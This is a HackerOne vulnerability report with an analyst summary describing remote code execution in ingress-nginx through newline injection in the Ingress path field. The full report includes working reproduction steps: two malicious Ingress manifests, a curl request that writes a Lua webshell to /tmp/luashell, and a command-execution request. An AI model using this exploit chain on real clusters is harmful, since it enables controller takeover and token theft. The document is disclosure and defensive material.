# RCE on ingress-nginx-controller via Ingress spec.rules.http.paths.path Field Injection

## Metadata
- **Source:** HackerOne
- **Report:** 1620702 | https://hackerone.com/reports/1620702
- **Submitted:** 2022-06-30
- **Reporter:** ginoah
- **Program:** Kubernetes ingress-nginx
- **Bounty:** Not specified in report
- **Severity:** CRITICAL
- **Vuln:** Arbitrary File Write, Configuration Injection, Remote Code Execution, Path Traversal, Insufficient Input Validation
- **CVEs:** None
- **Category:** memory-binary

## Summary
An attacker with ingress create/update privileges can inject arbitrary NGINX configuration through the spec.rules.http.paths.path field to write arbitrary files and include malicious Lua code, achieving RCE on the ingress-nginx-controller pod. The vulnerability exploits insufficient sanitization of the path field which is directly interpolated into nginx.conf, allowing newline injection and config manipulation.

## Attack scenario
1. Attacker with ingress create/update RBAC permissions crafts a malicious Ingress resource with newline characters embedded in the path field
2. The path field injection breaks out of the location block and creates custom log_format and server directives in nginx.conf without proper escaping
3. Attacker creates a first Ingress to configure arbitrary file write via log_format with escape=none and access_log directives, writing malicious Lua code to /tmp/luashell
4. Attacker sends HTTP request with custom headers containing Lua payload to trigger file write to the target path
5. Attacker creates a second Ingress that includes the previously written malicious Lua file via the include directive in a location block
6. Attacker sends HTTP request to the included location, triggering execution of arbitrary Lua code which executes OS commands via io.popen()

## Root cause
The ingress-nginx controller fails to properly validate and sanitize the path field in Ingress specifications before embedding it into the generated nginx.conf file. Newline characters and special sequences are not escaped, allowing injection of arbitrary NGINX directives. The controller does not restrict file inclusion directives or validate that generated config is syntactically safe.

## Attacker mindset
An insider or compromised account with Kubernetes ingress management permissions exploits a trusted configuration field to escape sandbox constraints. The attacker leverages NGINX's powerful configuration language and Lua scripting to achieve container breakout, recognizing that input validation at the Kubernetes API layer is insufficient when the controller blindly interpolates user input into system configuration.

## Defensive takeaways
- Implement strict whitelist validation for path field - only allow alphanumeric characters, hyphens, underscores, dots, and forward slashes; reject any control characters or special sequences
- Escape or quote all user-supplied values before embedding in nginx.conf generation; use proper templating with automatic escaping
- Restrict or disable dangerous NGINX directives in ingress-generated configs (log_format with escape=none, include from user-controlled paths)
- Apply principle of least privilege - run ingress-nginx controller with minimal permissions and restricted file system access
- Implement config validation - parse and validate generated nginx.conf syntax before reloading NGINX to catch injection attempts
- Use security policies to restrict ingress creation/update permissions to trusted users/service accounts only
- Monitor NGINX reload events and generated config changes for anomalies
- Consider using read-only root filesystem and restricting write access to config directories

## Variant hunting
Test other Ingress fields for similar injection vulnerabilities (hostname, serviceName, headers)
Examine annotation handling for config injection vectors
Check if similar path injection exists in other Kubernetes ingress controllers (nginx, Apache, HAProxy)
Investigate whether the vulnerability applies to rewrite-target and other regex-based fields
Test if upstream connection directives can be manipulated for SSRF or lateral movement
Check if the vulnerability allows escaping to affect other ingress rules or the default server block

## MITRE ATT&CK
- T1190
- T1202
- T1059
- T1053
- T1098
- T1021
- T1133

## Notes
This is a critical privilege escalation from ingress management to container RCE. The attack is elegant in using NGINX's own features (logging, file inclusion, Lua) against itself. Affects ingress-nginx v1.2.1 and likely multiple earlier versions. The vulnerability requires existing Kubernetes API access but dramatically escalates impact to cluster control plane. The two-stage attack (write then include) bypasses simple path validation by using NGINX's log formatting and inclusion mechanisms.

## Full report
<details><summary>Expand</summary>

Report Submission Form

## Summary:

A user with ingress create/update privilege may inject config into `nginx.conf` with `path`.
Config the log_format and access_log to write arbitrary file.
Include the file we created to bypass `path` sanitizer to RCE.

## Kubernetes Version:

```
serverVersion:
  buildDate: "2022-03-06T21:32:53Z"
  compiler: gc
  gitCommit: e6c093d87ea4cbb530a7b2ae91e54c0842d8308a
  gitTreeState: clean
  gitVersion: v1.23.4
  goVersion: go1.17.7
  major: "1"
  minor: "23"
  platform: linux/amd64
```

## Component Version:

```
-------------------------------------------------------------------------------
NGINX Ingress controller
  Release:       v1.2.1
  Build:         08848d69e0c83992c89da18e70ea708752f21d7a
  Repository:    https://github.com/kubernetes/ingress-nginx
  nginx version: nginx/1.19.10

-------------------------------------------------------------------------------
```

## Steps To Reproduce:

  1. Create a kind cluster config

lab.yaml
```yaml
kind: Cluster
name: lab
apiVersion: kind.x-k8s.io/v1alpha4
nodes:
# the control plane node config
- role: control-plane
  kubeadmConfigPatches:
  - |
    kind: InitConfiguration
    nodeRegistration:
      kubeletExtraArgs:
        node-labels: "ingress-ready=true"
  extraPortMappings:
  - containerPort: 80
    hostPort: 80
    protocol: TCP
  - containerPort: 443
    hostPort: 443
    protocol: TCP
# the three workers
- role: worker
- role: worker
- role: worker
```

  2. Create a testing cluster with the previous config

```bash
kind create cluster --config lab.yaml
```

  3. Install nginx-ingress-controller

```bash
kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/main/deploy/static/provider/kind/deploy.yaml
```

  4. Create a the first malicious ingress

**This ingress will allow attacker to write arbitrary content to arbitrary file.**
(note that the service `not-exist-service` does not need to exist)

write_ingress.yaml
```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: webexp
spec:
  rules:
    - host: "example.com"
      http:
        paths:
          - path: "/x/ {\n
            }\n
          }\n
          log_format exploit escape=none $http_x_ginoah;\n
          server {\n
            server_name x.x;\n
            listen 80;\n
            listen [::]:80;\n
            location /z/ {\n
                access_log /tmp/luashell exploit;\n
            }\n
            location /x/ {\n
          #"
            pathType: Exact
            backend:
              service:
                name: not-exist-service
                port:
                  number: 8080
```

Apply the first malicious ingress config
```bash
kubectl apply -f write_ingress.yaml
```

  5. Write a malicious lua config to `/tmp/luashell`

Note that in other cluster config, the `localhost` may need to change to ingress-controller's ip.
```bash
curl localhost/z/ -H "host: x.x" -H 'x-ginoah: content_by_lua_block {ngx.req.read_body();local post_args = ngx.req.get_post_args();local cmd = post_args["cmd"];if cmd then f_ret = io.popen(cmd);local ret = f_ret:read("*a");ngx.say(string.format("%s", ret));end;}'
```

  6. Create a the second malicious ingress

**This ingress will include the malicious lua config, which allow attack to execute arbitrary command.**

webshell_ingress.yaml
```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: webexp
spec:
  rules:
    - host: "example.com"
      http:
        paths:
          - path: "/x/ {\n
            }\n
          }\n
          log_format exploit escape=none $http_x_ginoah;\n
          server {\n
            server_name x.x;\n
            listen 80;\n
            listen [::]:80;\n
            location /z/ {\n
                include /tmp/luashell;\n
            }\n
            location /x/ {\n
          #"
            pathType: Exact
            backend:
              service:
                name: not-exist-service
                port:
                  number: 8080
```

Apply the second malicious ingress config
```bash
kubectl apply -f webshell_ingress.yaml
```

  7. RCE and get output

```bash
curl localhost/z/ -H "host: x.x" -d "cmd=id"
```

## Supporting Material/References:

  * [attachment / reference]

{F1802462}

## Impact

A cluster user/SA with ingress create/update privilege may Remote Code Execution on `ingress-nginx-controller` pod

After RCE on ingress-nginx-controller the attacker may
- utilize the token to take further action on cluster with ingress's privilege
- eavesdrop the traffic, modify other ingress rule
- DOS
- ...

</details>

---
*Analysed by Claude on 2026-05-12*
